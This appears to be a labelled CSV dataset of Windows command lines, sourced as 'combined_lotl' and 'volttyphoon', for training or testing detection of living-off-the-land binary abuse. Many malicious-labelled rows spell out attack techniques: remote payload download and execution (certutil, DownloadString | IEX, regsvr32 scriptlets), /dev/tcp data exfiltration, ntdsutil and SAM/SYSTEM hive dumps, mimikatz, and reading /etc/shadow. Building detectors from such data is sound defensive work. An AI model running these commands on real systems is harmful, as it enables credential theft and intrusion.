command,label,source,command_id
Pcwrun.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,273
"del ""C:\Program Files\Windows\nuuxdwg.log"" /f /q",0,combined_lotl,274
ping.exe 192.168.94.185,0,combined_lotl,275
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\xidnpbnr\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,276
"attrib +h ""C:\Windows\duuawtz.dll""",0,combined_lotl,277
cmd.exe - < {PATH}:payload.bat,1,combined_lotl,278
"del ""D:\Users\peisjj\Desktop\rkywmpmy.dat"" /f /q",0,combined_lotl,279
"ntdsutil snapshot “ac i ntds”
create quit quit",1,combined_lotl,280
squirrel.exe --updateRollback={REMOTEURL},1,combined_lotl,281
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\AppData\klbnk.txt\"" \""C:\Logs\eitxaaxds.ini\"""" /sc daily /st 23:00",0,combined_lotl,282
"dir.exe ""D:\Users\euitqk\Documents\Downloads"" /s /b",0,combined_lotl,283
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\AppData\mfung.dat\"" \""D:\AppData\Logs\vbcrygy.txt\"""" /sc daily /st 23:00",0,combined_lotl,284
"dir ""C:\Logs\Temp"" /s /b",0,combined_lotl,285
evntcmd.exe [/s <computername>] [/v <verbositylevel>] [/n] <filename>,0,volttyphoon,286
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',1,combined_lotl,287
fsianycpu.exe,1,combined_lotl,288
winword.exe {REMOTEURL},1,combined_lotl,289
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\dfgbcis.txt\"" \""C:\Program Files\Logs\kwwfcgiej.txt\"""" /sc daily /st 23:00",0,combined_lotl,290
"powershell -Command ""Get-WmiObject -Class Win32_Process -Filter 'name like \""%chrome.exe%\""'""",0,combined_lotl,291
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},1,combined_lotl,292
colorcpl {PATH},1,combined_lotl,293
C:\Windows\System32\net.exe use Z: \\192.168.4.160\data,0,combined_lotl,294
"icacls.exe ""D:\Users\cenaqnw\Documents\rpkazgvcg.sys"" /grant Everyone:F",0,combined_lotl,295
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Temp\rzjrze.log\"" \""C:\AppData\ymbosb.txt\"""" /sc daily /st 23:00",0,combined_lotl,296
"D:\Windows\System32\icacls.exe ""D:\Temp\Users\wagorvqmta.dat"" /grant Everyone:F",0,combined_lotl,297
vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},1,combined_lotl,298
dtrace [-BCeFhlqSvVwYZ] [-b bufsz] [-c cmd] [-D name[=def]] [-I path],0,combined_lotl,299
ping.exe 192.168.60.187,0,combined_lotl,300
winget.exe install --manifest {PATH:.yml},1,combined_lotl,301
echo g5rVLoWZvd1r > D:\Temp\nawpjg.sys,0,combined_lotl,302
"""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""",1,combined_lotl,303
ping.exe 192.168.248.247,0,combined_lotl,304
"type ""D:\Users\ofdxn.exe""",0,combined_lotl,305
"findstr.exe /i ""warning"" backup.dat",0,combined_lotl,306
"fsutil.exe file layout ""C:\Users\ysmunmtq.log""",0,combined_lotl,307
fsutil.exe volume [dismount] D:\Users\auouu\Desktop,0,combined_lotl,308
"findstr /C:""1fQEpvbNgIFa"" ""C:\Users\mfvul\Pictures\Desktop\iehapm.ini""",0,combined_lotl,309
replace drive=2,0,combined_lotl,310
"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb",1,combined_lotl,311
"C:\Windows\copy.exe ""C:\Users\Users\maiouxpkc.sys"" ""C:\Logs\vxyjghnhi.txt""",0,combined_lotl,312
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,1,combined_lotl,313
finger user@example.host.com | more +2 | cmd,1,combined_lotl,314
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,1,combined_lotl,315
net user hmnxccnq /add,0,combined_lotl,316
"certutil -hashfile ""D:\Users\klwtabak\Documents\Desktop\lfbwt.exe"" SHA256",0,combined_lotl,317
C:\Windows\System32\certutil.exe -decode {PATH:.base64} {PATH},1,combined_lotl,318
Update.exe --updateRollback={REMOTEURL},1,combined_lotl,319
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\Users\aejfdkv.sys\"" \""C:\Users\ugqborh\Downloads\qmwflzkqnu.exe\"""" /sc daily /st 23:00",0,combined_lotl,320
fsutil behavior query {allowextchar | bugcheckoncorrupt | disable8dot3 [<volumepath>] | disablecompression | disablecompressionlimit | disableencryption | disablefilemetadataoptimization | disablelastaccess | disablespotcorruptionhandling | disabletxf | disablewriteautotiering | encryptpagingfile | mftzone | memoryusage | quotanotify | symlinkevaluation | disabledeletenotify},0,combined_lotl,321
delete partition,0,combined_lotl,322
"fsutil clfs authenticate ""C:\example_log.blf""",0,combined_lotl,323
Update.exe --createShortcut={PATH:.exe} -l=Startup,1,combined_lotl,324
"attrib.exe +h ""C:\Temp\AppData\onvnsstkag.log""",0,combined_lotl,325
"del ""D:\Users\ztcui\Desktop\Pictures\txwvsx.log"" /f /q",0,combined_lotl,326
cmstp.exe /ni /s {REMOTEURL:.inf},1,combined_lotl,327
"icacls.exe ""D:\Users\rnjaj\Documents\Pictures\uvvmfbwr.sys"" /grant Everyone:F",0,combined_lotl,328
xsd.exe {REMOTEURL},1,combined_lotl,329
add disk=276 [align=276] [wait] [noerr],0,combined_lotl,330
net.exe localgroup Administrators knstqtng /add,0,combined_lotl,331
"del ""D:\Temp\Users\qnvsmr.dll"" /f /q",0,combined_lotl,332
"E:\Windows\System32\dir.exe ""C:\Users\Temp""",0,combined_lotl,333
"certutil.exe -hashfile ""D:\Temp\yasfph.log"" SHA256",0,combined_lotl,334
rem,0,combined_lotl,335
C:\Windows\System32\netstat.exe -an,0,combined_lotl,336
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",1,combined_lotl,337
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},1,combined_lotl,338
"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",1,combined_lotl,339
"mkdir.exe ""C:\Temp\AppData""",0,combined_lotl,340
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,1,combined_lotl,341
fsi.exe {PATH:.fsscript},1,combined_lotl,342
"C:\Windows\System32\copy.exe ""C:\AppData\AppData\qgdmk.ini"" ""C:\AppData\Users\akadhmrt.sys""",0,combined_lotl,343
"findstr.exe /C:""FYAcklC8yZro"" ""C:\Temp\Program Files\ogfdkwb.log""",0,combined_lotl,344
cmdl32 /vpn /lan %cd%\config,1,combined_lotl,345
"attrib +h ""D:\Users\nzom\Documents\Documents\dqkxkpxjuq.dll""",0,combined_lotl,346
"attrib +h ""D:\Logs\jqwdoq.exe""",0,combined_lotl,347
"del ""D:\Logs\Users\uvrobffq.exe"" /f /q",0,combined_lotl,348
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},1,combined_lotl,349
query.exe user,1,combined_lotl,350
echo.exe SJeVW5GrsD3C > D:\AppData\lqhkho.sys,0,combined_lotl,351
msiexec /z {PATH_ABSOLUTE:.dll},1,combined_lotl,352
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,1,combined_lotl,353
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\ediemwbjn.ini\"" \""D:\AppData\Temp\kzeksxci.dll\"""" /sc daily /st 23:00",0,combined_lotl,354
net.exe use Z: \\192.168.199.210\data,0,combined_lotl,355
C:\Program Files (x86)\net.exe localgroup Administrators user1 /add,0,combined_lotl,356
"create lun mirror [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]",0,combined_lotl,357
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1,combined_lotl,358
"echo.exe %DATE% %TIME% >> ""D:\Program Files\rwwwgk.ini""",0,combined_lotl,359
iscsicpl.exe,1,combined_lotl,360
"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",1,combined_lotl,361
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,1,combined_lotl,362
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},1,combined_lotl,363
csi.exe {PATH:.cs},1,combined_lotl,364
net localgroup Administrators parqhcjq /add,0,combined_lotl,365
Dxcap.exe -c {PATH_ABSOLUTE:.exe},1,combined_lotl,366
compact vdisk,0,combined_lotl,367
"type.exe ""D:\Logs\blowlhgcud.txt""",0,combined_lotl,368
Gpscript /startup,1,combined_lotl,369
C:\Program Files (x86)\netstat.exe -an,0,combined_lotl,370
"del ""D:\Logs\Temp\vgxxdrzrke.dll"" /f /q",0,combined_lotl,371
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\qbglaci\Downloads\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,372
freedisk 50mb,0,combined_lotl,373
net user dbnenwlg /add,0,combined_lotl,374
regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,1,combined_lotl,375
"findstr /C:""yHCRviF4pKdS"" ""C:\Users\kbkm\Documents\qiqitm.exe""",0,combined_lotl,376
C:\Windows\fsutil.exe 8dot3name [query] [<volumepath>],0,combined_lotl,377
create lun automagic size=405 [noerr],0,combined_lotl,378
ping.exe 192.168.182.125,0,combined_lotl,379
winfile.exe {PATH:.exe},1,combined_lotl,380
"echo %DATE% %TIME% >> ""D:\Program Files\Program Files\ajyov.txt""",0,combined_lotl,381
"findstr.exe /C:""QmRaLbohhTlj"" ""C:\Logs\wdbfbs.ini""",0,combined_lotl,382
"rmdir ""D:\AppData\Windows"" /s /q",0,combined_lotl,383
"move ""C:\AppData\Logs\ybsxkjfceg.ini"" ""D:\Logs\Windows\xolwwfc.ini""",0,combined_lotl,384
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,385
"icacls ""C:\Users\aobyzjz\Pictures\Downloads\qfgrzaeecs.dat"" /grant Everyone:F",0,combined_lotl,386
"echo %DATE% %TIME% >> ""D:\Program Files\Logs\bzfyai.ini""",0,combined_lotl,387
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\wgjzhir\Documents\ayjacq.dll\"" \""D:\AppData\Program Files\jrszwnw.txt\"""" /sc daily /st 23:00",0,combined_lotl,388
net.exe user ofzpdcbb /add,0,combined_lotl,389
"move.exe ""C:\Windows\dbduacf.ini"" ""D:\Temp\Users\ckhmqy.sys""",0,combined_lotl,390
wsl.exe -u root -e cat /etc/shadow,1,combined_lotl,391
"fsutil.exe file layout ""D:\AppData\Windows\uipjwmer.txt""",0,combined_lotl,392
"move ""D:\Users\khpiazs.exe"" ""D:\Users\daeyt\Desktop\amzpsmlxc.txt""",0,combined_lotl,393
"findstr.exe /C:""6DBuPKved6SP"" ""C:\AppData\uszgrsnt.dll""",0,combined_lotl,394
net use Z: \\192.168.23.141\data,0,combined_lotl,395
net.exe user hyuvcopt /add,0,combined_lotl,396
mshta.exe {PATH:.hta},1,combined_lotl,397
"icacls.exe ""D:\Logs\Program Files\napmxml.dll"" /grant Everyone:F",0,combined_lotl,398
net localgroup Administrators qbpcsycp /add,0,combined_lotl,399
C:\Windows\ping.exe 192.168.194.6,0,combined_lotl,400
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",1,combined_lotl,401
"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,402
ping.exe 192.168.243.182,0,combined_lotl,403
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",1,combined_lotl,404
"findstr /C:""eELkxRo7GX1r"" ""C:\Program Files\Users\fbvzgncg.dll""",0,combined_lotl,405
"mkdir.exe ""C:\Users\dgrdp\Pictures""",0,combined_lotl,406
"C:\Windows\type.exe ""C:\Windows\Windows\bojhi.txt""",0,combined_lotl,407
"fsutil file layout ""D:\Windows\Temp\fmulrdyxfb.exe""",0,combined_lotl,408
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,1,combined_lotl,409
type.exe {PATH_ABSOLUTE} > {PATH_SMB},1,combined_lotl,410
net user ephymnyn /add,0,combined_lotl,411
"mkdir ""D:\Users\iwzv\Pictures""",0,combined_lotl,412
"type ""D:\Program Files\ffwsedgu.exe""",0,combined_lotl,413
net user udynkeqr /add,0,combined_lotl,414
"echo %DATE% %TIME% >> ""D:\Users\olfbnq\Downloads\Pictures\olkvitniha.log""",0,combined_lotl,415
"mkdir.exe ""D:\Logs\Program Files""",0,combined_lotl,416
net.exe user mguhhgfk /add,0,combined_lotl,417
"type.exe ""D:\Logs\qxlhbcf.dat""",0,combined_lotl,418
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\nnunfve\Downloads\miwvqaja.dat\"" \""D:\Logs\Users\bberxdy.dll\"""" /sc daily /st 23:00",0,combined_lotl,419
"findstr.exe /C:""oYjK8e2HJQnw"" ""D:\Users\upswdcnc\Documents\Pictures\cgpqnasss.txt""",0,combined_lotl,420
"fsutil.exe file layout ""C:\Users\pggsojkd\Documents\aelmnsfebb.sys""",0,combined_lotl,421
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},1,combined_lotl,422
"adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}",1,combined_lotl,423
"attrib.exe +h ""C:\Temp\Temp\clnqidf.dll""",0,combined_lotl,424
"del ""C:\Temp\AppData\gngaip.dat"" /f /q",0,combined_lotl,425
"move ""D:\AppData\ascwnit.exe"" ""C:\Program Files\Temp\sefutm.sys""",0,combined_lotl,426
"icacls ""D:\AppData\ywmbhe.dat"" /grant Everyone:F",0,combined_lotl,427
"move ""C:\Users\tpqg\Desktop\vtveekx.dat"" ""C:\Program Files\AppData\ulihzqvnr.dat""",0,combined_lotl,428
net user nijelhcf /add,0,combined_lotl,429
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},1,combined_lotl,430
echo.exe ovmdj0rHNjwJ > C:\Program Files\zaxwewrhn.dat,0,combined_lotl,431
"mkdir ""C:\Users\zadmfriv\Documents""",0,combined_lotl,432
"move.exe ""C:\Users\AppData\pvsvy.ini"" ""D:\Program Files\Temp\rrmtqjdyk.dll""",0,combined_lotl,433
"findstr /C:""lM6d4Hxj3lEq"" ""D:\Windows\mhnhgpm.ini""",0,combined_lotl,434
"del ""D:\AppData\Logs\bbzfyqjgy.dll"" /f /q",0,combined_lotl,435
"dir.exe C:\Users\{REDACTED}\.ssh\known_hosts
dir.exe C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
mimikatz.exe
reg.exe query hklm\software\OpenSSH
reg.exe query hklm\software\OpenSSH\Agent
reg.exe query hklm\software\realvnc
reg.exe query hklm\software\realvnc\vncserver
reg.exe query hklm\software\realvnc\Allusers
reg.exe query hklm\software\realvnc\Allusers\vncserver
reg.exe query hkcu\software\{REDACTED}\putty\session
reg.exe save hklm\sam ss.dat
reg.exe save hklm\system sy.dat",1,volttyphoon,436
net.exe user stzlcqpl /add,0,combined_lotl,437
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},1,combined_lotl,438
icacls.exe backup.dat /grant Everyone:R,0,combined_lotl,439
net.exe user meoqvglb /add,0,combined_lotl,440
C:\Program Files\cmd.exe /c dir C:\Temp,0,combined_lotl,441
"echo %DATE% %TIME% >> ""D:\Logs\Program Files\tuinstsof.log""",0,combined_lotl,442
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',1,combined_lotl,443
regsvcs.exe {PATH:.dll},1,combined_lotl,444
"icacls.exe ""D:\Users\ewvkm.sys"" /grant Everyone:F",0,combined_lotl,445
"certutil.exe -hashfile ""D:\Users\abdxpjknxz.log"" SHA256",0,combined_lotl,446
"fsutil file layout ""C:\Users\ocfrysj\Desktop\Downloads\vlgzk.ini""",0,combined_lotl,447
"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",1,combined_lotl,448
fsutil.exe trace decode,1,combined_lotl,449
DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,1,combined_lotl,450
"cmd.exe /Q /c wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1",1,volttyphoon,451
"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",1,combined_lotl,452
"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1,combined_lotl,453
dotnet.exe {PATH:.dll},1,combined_lotl,454
filesystems,0,combined_lotl,455
"icacls ""C:\Temp\Users\bdhctzjstx.exe"" /grant Everyone:F",0,combined_lotl,456
net.exe use Z: \\192.168.150.9\public,0,combined_lotl,457
net.exe use Z: \\192.168.21.142\public,0,combined_lotl,458
"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{cmd.exe}"" /sc daily",1,combined_lotl,459
"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,460
offline disk,0,combined_lotl,461
"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",1,combined_lotl,462
diskraid /s C:\scripts\ubttnx.txt,0,combined_lotl,463
finger [-l] [<user>] [@<host>] [...],0,combined_lotl,464
attrib.exe +r document.txt,0,combined_lotl,465
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\Users -Recurse | Select-Object FullName, Length""",0,combined_lotl,466
reenumerate {subsystems | drives},0,combined_lotl,467
net user oavfhunp /add,0,combined_lotl,468
"C:\Windows\System32\type.exe ""C:\Logs\Users\gzjgnhds.ini""",0,combined_lotl,469
echo ygMHmqFd4DBW > D:\Logs\qjmwzp.dat,0,combined_lotl,470
"del ""C:\Windows\jxqsxzgwvz.dll"" /f /q",0,combined_lotl,471
ping.exe 192.168.124.205,0,combined_lotl,472
"copy ""C:\Users\vqert.dat"" ""D:\Temp\otypeypdjs.dat""",0,combined_lotl,473
C:\Program Files\icacls.exe data.log /grant Everyone:R,0,combined_lotl,474
shrink [desired=<n>] [minimum=<n>] [nowait] [noerr],0,combined_lotl,475
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",1,combined_lotl,476
"del ""C:\Program Files\Logs\ccorj.log"" /f /q",0,combined_lotl,477
"C:\Windows\dir.exe ""C:\AppData\Temp""",0,combined_lotl,478
dnscmd <servername> <command> [<command parameters>],0,combined_lotl,479
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},1,combined_lotl,480
"attrib.exe +h ""C:\Temp\plszrc.txt""",0,combined_lotl,481
#End of script,0,combined_lotl,482
"copy ""C:\Temp\dgjhvoicte.txt"" ""D:\Windows\Logs\frgvxmx.exe""",0,combined_lotl,483
Version: 1.0.0.7,0,combined_lotl,484
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1,combined_lotl,485
net.exe user pynxretv /add,0,combined_lotl,486
"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",1,combined_lotl,487
"del ""D:\Users\Windows\lugejjxpr.ini"" /f /q",0,combined_lotl,488
"echo %DATE% %TIME% >> ""C:\Windows\Users\ttnuxtlqu.dll""",0,combined_lotl,489
"tasklist | findstr ""winlogon.exe""",0,combined_lotl,490
net localgroup Administrators mgvjolii /add,0,combined_lotl,491
net.exe user huenavsy /add,0,combined_lotl,492
"C:\Windows\icacls.exe ""C:\AppData\tolerpv.ini"" /grant Everyone:F",0,combined_lotl,493
"type.exe ""C:\Windows\iomhkqi.dll""",0,combined_lotl,494
ping 192.168.75.129,0,combined_lotl,495
"E:\Windows\certutil.exe -hashfile ""D:\Users\Windows\kuijvxfmj.dll"" SHA256",0,combined_lotl,496
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",1,combined_lotl,497
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",1,combined_lotl,498
"dir.exe ""D:\Program Files\Temp""",0,combined_lotl,499
"fsutil file layout ""D:\Windows\Program Files\esqknfn.log""",0,combined_lotl,500
"move.exe ""D:\Windows\Users\jexvmuyerw.sys"" ""C:\Users\shcp\Documents\Desktop\yauissy.dat""",0,combined_lotl,501
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",1,combined_lotl,502
"attrib.exe +h ""D:\Users\Logs\pbqalhsp.txt""",0,combined_lotl,503
delete disk [noerr] [override],0,combined_lotl,504
echo.exe X5Srj95Q43dn > C:\Windows\Temp\ixenzzm.dll,0,combined_lotl,505
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""D:\Windows\Program Files\sorps.log\"" \""D:\Logs\Windows\svgosul.log\"""" /sc daily /st 23:00",0,combined_lotl,506
"powershell -Command ""Get-ChildItem -Path C:\Logs\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,507
"copy.exe ""C:\Temp\mxawtje.dll"" ""D:\Temp\Temp\dpwqxakuf.ini""",0,combined_lotl,508
C:\Windows\System32\net.exe localgroup Administrators ykhqhble /add,0,combined_lotl,509
netsh.exe add helper {PATH_ABSOLUTE:.dll},1,combined_lotl,510
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,1,combined_lotl,511
"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",1,combined_lotl,512
"mkdir.exe ""D:\Users\crhnshf\Downloads""",0,combined_lotl,513
"mkdir.exe ""D:\Users\Logs""",0,combined_lotl,514
chap initiator remember secret=[yBClNxxGR4Vc4CVr] target=iqn.2025-11.com.example:xfckvlmb,0,combined_lotl,515
VisualUiaVerifyNative.exe,1,combined_lotl,516
C:\Program Files\cmd.exe /c dir C:\Program Files,0,combined_lotl,517
"D:\Windows\fsutil.exe file layout ""C:\Program Files\mxcsabtxtr.txt""",0,combined_lotl,518
cdb.exe -cf {PATH:.wds} -o notepad.exe,1,combined_lotl,519
eventvwr.exe,1,combined_lotl,520
clean [all],0,combined_lotl,521
"C:\Program Files\powershell.exe -Command ""Get-Process""",0,combined_lotl,522
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\nvojzuvq.ini\"" \""D:\Users\gnrk\Desktop\slojn.dll\"""" /sc daily /st 23:00",0,combined_lotl,523
"move.exe ""D:\Program Files\habigreqbg.log"" ""D:\Program Files\kgbzqn.sys""",0,combined_lotl,524
net localgroup Administrators dsjfzprh /add,0,combined_lotl,525
"mkdir.exe ""D:\Temp\Users""",0,combined_lotl,526
mspub.exe {REMOTEURL},1,combined_lotl,527
"C:\Windows\System32\type.exe ""D:\AppData\croykt.ini""",0,combined_lotl,528
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,1,combined_lotl,529
"copy.exe ""C:\AppData\Users\asjocarda.ini"" ""C:\AppData\xwxaqdd.dll""",0,combined_lotl,530
net.exe localgroup Administrators dlbebbbd /add,0,combined_lotl,531
pcalua.exe -a {PATH:.exe},1,combined_lotl,532
evntcmd [/s <computername>] [/v <verbositylevel>] [/n] C:\Temp\pdhitofcxo.exe,0,combined_lotl,533
fsutil.exe wim [enumwims] C,0,combined_lotl,534
"attrib.exe +h ""C:\Users\tjowh\Documents\Pictures\fhhwi.sys""",0,combined_lotl,535
uniqueid disk id=5f1b2c36,0,combined_lotl,536
"dir ""D:\Users\snkhhhr\Documents"" /s /b",0,combined_lotl,537
net localgroup Administrators spnozkkr /add,0,combined_lotl,538
"del ""D:\Users\Logs\kfdeqiul.dll"" /f /q",0,combined_lotl,539
"C:\Windows\System32\fsutil.exe file layout ""C:\Logs\Program Files\zvesqoz.dat""",0,combined_lotl,540
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\hsnlmwdl\Downloads\Pictures\xfrci.dll\"" \""D:\Users\voxosi\Pictures\Downloads\jeqwjatn.ini\"""" /sc daily /st 23:00",0,combined_lotl,541
"fsutil.exe file layout ""C:\Logs\ctmnbmhl.sys""",0,combined_lotl,542
C:\Windows\net.exe user ajthsbxn /add,0,combined_lotl,543
net.exe use Z: \\192.168.178.144\backup,0,combined_lotl,544
Update.exe --removeShortcut={PATH:.exe}-l=Startup,1,combined_lotl,545
"type.exe ""D:\Users\adxukxxc.log""",0,combined_lotl,546
"move ""C:\Users\qfdxmcupc.sys"" ""C:\Users\cvcwg.txt""",0,combined_lotl,547
ping.exe 192.168.61.107,0,combined_lotl,548
"C:\Windows\System32\fsutil.exe file layout ""C:\Temp\Users\siojrahrt.dll""",0,combined_lotl,549
C:\Windows\net.exe user afejlnnn /add,0,combined_lotl,550
create partition,0,combined_lotl,551
D:\Windows\System32\fsutil.exe volume [querycluster] C:\Logs <cluster> [<cluster>] …,0,combined_lotl,552
verclsid.exe /S /C {CLSID},1,combined_lotl,553
VSLaunchBrowser.exe .exe {REMOTEURL:.exe},1,combined_lotl,554
devinit.exe run -t msi-install -i {REMOTEURL:.msi},1,combined_lotl,555
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},1,combined_lotl,556
"findstr.exe /C:""2hq8quxVpDpH"" ""D:\Users\slyxa\Documents\wdcyb.txt""",0,combined_lotl,557
findstr.exe [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:ERRORLEVEL] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [E:][C:\AppData\AppData]C:\AppData\uzynvyeh.ini[ ...],0,combined_lotl,558
findstr /S /I cpassword \\sysvol\policies\*.xml,1,combined_lotl,559
"move ""D:\Users\kebs\Documents\Downloads\hccwb.ini"" ""C:\Users\btblhpav\Downloads\etjelsp.exe""",0,combined_lotl,560
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\jrrbbphug.dat\"" \""D:\Logs\tirjlyz.log\"""" /sc daily /st 23:00",0,combined_lotl,561
"C:\Program Files (x86)\findstr.exe /i ""error"" config.ini",0,combined_lotl,562
"echo %DATE% %TIME% >> ""D:\Windows\qjtadfy.exe""",0,combined_lotl,563
"icacls ""C:\AppData\fqwuaobz.sys"" /grant Everyone:F",0,combined_lotl,564
